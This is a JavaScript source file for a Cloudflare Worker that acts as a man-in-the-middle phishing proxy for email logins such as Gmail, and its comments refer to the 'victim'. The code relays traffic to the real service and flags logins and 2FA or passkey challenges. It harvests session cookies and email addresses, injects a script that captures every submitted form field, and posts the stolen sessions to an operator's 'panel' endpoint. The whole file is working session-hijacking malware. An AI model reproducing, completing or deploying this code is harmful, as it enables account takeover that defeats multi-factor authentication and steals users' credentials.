// ============================================================
// DYNAMIC PROXY WORKER - Handles ANY provider with 2FA/Passkey
// ============================================================

// Configuration injected at deploy time by the panel
// The panel uses _embed_inject_payload() to inject __CONFIG_JSON__
const CONFIG = __CONFIG_JSON__;
const TARGET_BASE_URL = CONFIG.targetUrl || 'https://mail.google.com';

// Session storage (in-memory - consider using KV for production)
const sessions = new Map();

// ============================================================
// MAIN REQUEST HANDLER
// ============================================================

async function handleRequest(request) {
    const url = new URL(request.url);
    const path = url.pathname;
    const method = request.method;
    
    // Handle special endpoints
    if (path === '/capture-session') {
        return handleSessionCapture(request);
    }
    
    if (path === '/worker-status') {
        return new Response(JSON.stringify({
            status: 'active',
            target: TARGET_BASE_URL,
            config: CONFIG
        }), {
            headers: { 'Content-Type': 'application/json' }
        });
    }
    
    // ============================================================
    // PROXY MODE: Forward everything to the target service
    // ============================================================
    
    // Build the target URL
    let targetUrl = TARGET_BASE_URL + path;
    if (url.search) {
        targetUrl += url.search;
    }
    
    // Forward the request with all headers
    const headers = new Headers(request.headers);
    
    // Remove Cloudflare-specific headers
    headers.delete('cf-connecting-ip');
    headers.delete('cf-ray');
    headers.delete('cf-visitor');
    headers.delete('cf-request-id');
    
    // Add session tracking header if needed
    const sessionId = headers.get('X-Session-Id') || generateSessionId();
    if (!headers.has('X-Session-Id')) {
        headers.set('X-Session-Id', sessionId);
    }
    
    // Clone the request body for POST/PUT
    let body = null;
    if (method !== 'GET' && method !== 'HEAD') {
        try {
            body = await request.clone().text();
        } catch (e) {
            // Handle streaming bodies
            body = await request.clone().arrayBuffer();
        }
    }
    
    try {
        // ============================================================
        // FORWARD REQUEST TO TARGET
        // ============================================================
        const response = await fetch(targetUrl, {
            method: method,
            headers: headers,
            body: body,
            redirect: 'manual'  // Don't follow redirects automatically
        });
        
        // ============================================================
        // CAPTURE SESSION DATA ON SUCCESSFUL LOGIN
        // ============================================================
        if (isLoginSuccess(response, url.pathname)) {
            await captureSessionData(request, response, sessionId);
        }
        
        // ============================================================
        // HANDLE REDIRECTS - Preserve session cookies
        // ============================================================
        if (response.status >= 300 && response.status < 400) {
            const location = response.headers.get('Location');
            if (location) {
                // If redirect is to the same domain, proxy it
                if (location.startsWith('/') || location.includes(TARGET_BASE_URL)) {
                    return handleRedirect(request, location, response, sessionId);
                }
                // Otherwise, return the redirect to the client
            }
        }
        
        // ============================================================
        // INTERCEPT AND CAPTURE 2FA/CHALLENGE RESPONSES
        // ============================================================
        if (isTwoFactorChallenge(response, url.pathname)) {
            await captureTwoFactorChallenge(request, response, sessionId);
        }
        
        // ============================================================
        // RETURN THE RESPONSE TO THE VICTIM
        // ============================================================
        const responseHeaders = new Headers(response.headers);
        
        // Ensure CORS headers for the panel
        responseHeaders.set('Access-Control-Allow-Origin', '*');
        responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        responseHeaders.set('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Session-Id');
        
        // Inject session tracking into HTML responses
        const contentType = response.headers.get('Content-Type') || '';
        if (contentType.includes('text/html')) {
            const html = await response.text();
            const injectedHtml = injectSessionTracking(html, sessionId);
            return new Response(injectedHtml, {
                status: response.status,
                headers: responseHeaders
            });
        }
        
        // For non-HTML responses, return as-is
        return new Response(response.body, {
            status: response.status,
            headers: responseHeaders
        });
        
    } catch (error) {
        console.error('Proxy error:', error);
        return new Response(JSON.stringify({
            error: 'Proxy error',
            message: error.message
        }), {
            status: 500,
            headers: { 'Content-Type': 'application/json' }
        });
    }
}

// ============================================================
// SESSION CAPTURE FUNCTIONS
// ============================================================

function generateSessionId() {
    return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function isLoginSuccess(response, path) {
    // Check if this is a successful login response
    const status = response.status;
    const url = response.url || '';
    
    // Success indicators
    const successIndicators = [
        'login', 'signin', 'auth', 'success',
        'oauth2', 'callback', 'redirect'
    ];
    
    // Check for 200 OK on login-related paths
    if (status === 200) {
        for (let indicator of successIndicators) {
            if (path.includes(indicator) || url.includes(indicator)) {
                return true;
            }
        }
    }
    
    // Check for redirect to dashboard/mail
    const location = response.headers.get('Location') || '';
    if (status >= 300 && status < 400) {
        const successPaths = ['mail', 'inbox', 'dashboard', 'home', 'myaccount'];
        for (let p of successPaths) {
            if (location.includes(p) || location.includes('/' + p)) {
                return true;
            }
        }
    }
    
    return false;
}

function isTwoFactorChallenge(response, path) {
    // Detect 2FA/challenge responses
    const contentType = response.headers.get('Content-Type') || '';
    const status = response.status;
    const url = response.url || '';
    
    // 2FA indicators
    const challengeIndicators = [
        '2fa', '2step', 'twofactor', 'mfa', 'multifactor',
        'challenge', 'verify', 'code', 'authenticator',
        'passkey', 'webauthn', 'securitykey', 'totp',
        'sms', 'phone', 'backup', 'recovery'
    ];
    
    // Check URL or path
    for (let indicator of challengeIndicators) {
        if (path.includes(indicator) || url.includes(indicator)) {
            return true;
        }
    }
    
    return false;
}

async function captureSessionData(request, response, sessionId) {
    try {
        // Get all cookies from the response
        const cookies = response.headers.get('Set-Cookie') || '';
        const allCookies = parseCookies(cookies);
        
        // Get session from storage
        let session = sessions.get(sessionId) || {
            id: sessionId,
            startTime: Date.now(),
            cookies: {},
            headers: {},
            loginData: {},
            challenges: [],
            status: 'pending'
        };
        
        // Update session with captured data
        session.cookies = { ...session.cookies, ...allCookies };
        session.status = 'authenticated';
        session.authTime = Date.now();
        
        // Extract user info from response
        const userInfo = await extractUserInfo(response);
        if (userInfo) {
            session.userInfo = userInfo;
        }
        
        // Store the session
        sessions.set(sessionId, session);
        
        // Send to panel
        await sendToPanel(session);
        
        console.log(`✅ Session captured: ${sessionId} (${session.userInfo?.email || 'unknown'})`);
        
    } catch (error) {
        console.error('Session capture error:', error);
    }
}

async function captureTwoFactorChallenge(request, response, sessionId) {
    try {
        let session = sessions.get(sessionId) || {
            id: sessionId,
            startTime: Date.now(),
            cookies: {},
            challenges: []
        };
        
        // Log the challenge
        session.challenges.push({
            type: '2fa',
            timestamp: Date.now(),
            url: response.url,
            status: response.status
        });
        
        sessions.set(sessionId, session);
        
        console.log(`🔐 2FA Challenge detected for session: ${sessionId}`);
        
    } catch (error) {
        console.error('2FA capture error:', error);
    }
}

function parseCookies(cookieString) {
    const cookies = {};
    if (!cookieString) return cookies;
    
    const cookieParts = cookieString.split(';');
    for (let part of cookieParts) {
        const [name, value] = part.trim().split('=');
        if (name && value) {
            cookies[name] = value;
        }
    }
    return cookies;
}

async function extractUserInfo(response) {
    // Try to extract user info from HTML or JSON
    const contentType = response.headers.get('Content-Type') || '';
    const url = response.url || '';
    
    // Extract from URL if it contains user info
    const urlMatch = url.match(/[?&](?:user|email|account)=([^&]+)/);
    if (urlMatch) {
        return { email: decodeURIComponent(urlMatch[1]) };
    }
    
    // Try to get from HTML
    if (contentType.includes('text/html')) {
        try {
            const html = await response.clone().text();
            // Look for email in HTML
            const emailMatch = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
            if (emailMatch) {
                return { email: emailMatch[0] };
            }
            
            // Look for user display name
            const nameMatch = html.match(/"displayName":"([^"]+)"/);
            if (nameMatch) {
                return { displayName: nameMatch[1] };
            }
        } catch (e) {
            // Ignore HTML parsing errors
        }
    }
    
    return null;
}

function injectSessionTracking(html, sessionId) {
    // Inject session tracking script
    const trackingScript = `
    <script>
        // Session tracking
        window.__sessionId = '${sessionId}';
        console.log('🔐 Session ID:', window.__sessionId);
        
        // Track form submissions
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // Send to worker for capture
            fetch('/capture-form', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Session-Id': window.__sessionId
                },
                body: JSON.stringify({
                    url: window.location.href,
                    data: data,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
        });
    </script>
    `;
    
    // Inject before </body>
    return html.replace('</body>', trackingScript + '</body>');
}

async function handleRedirect(request, location, response, sessionId) {
    // Handle redirects while preserving session
    const newUrl = location.startsWith('/') 
        ? TARGET_BASE_URL + location 
        : location;
    
    // Update the request to the new URL
    const newRequest = new Request(newUrl, {
        headers: request.headers,
        method: 'GET',  // Redirects are usually GET
    });
    
    // Add session ID header
    newRequest.headers.set('X-Session-Id', sessionId);
    
    return handleRequest(newRequest);
}

async function handleSessionCapture(request) {
    try {
        const data = await request.json();
        
        // Update session with captured data
        const sessionId = request.headers.get('X-Session-Id') || generateSessionId();
        let session = sessions.get(sessionId) || {
            id: sessionId,
            startTime: Date.now(),
            capturedData: []
        };
        
        session.capturedData.push(data);
        sessions.set(sessionId, session);
        
        // Send to panel
        await sendToPanel(session);
        
        return new Response(JSON.stringify({
            success: true,
            sessionId: sessionId
        }), {
            headers: { 'Content-Type': 'application/json' }
        });
        
    } catch (error) {
        return new Response(JSON.stringify({
            success: false,
            error: error.message
        }), {
            status: 500,
            headers: { 'Content-Type': 'application/json' }
        });
    }
}

async function sendToPanel(session) {
    // Send captured session to the panel
    // The panelEndpoint is injected at deploy time from CONFIG
    const panelUrl = CONFIG.panelEndpoint || 'http://localhost:8003/api/outlook/sessions/import';
    
    try {
        await fetch(panelUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + CONFIG.apiKey
            },
            body: JSON.stringify({
                session: session,
                provider: CONFIG.provider || 'google',
                targetUrl: CONFIG.targetUrl
            })
        });
    } catch (error) {
        console.error('Failed to send to panel:', error);
    }
}

// ============================================================
// WORKER ENTRY POINT
// ============================================================

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});
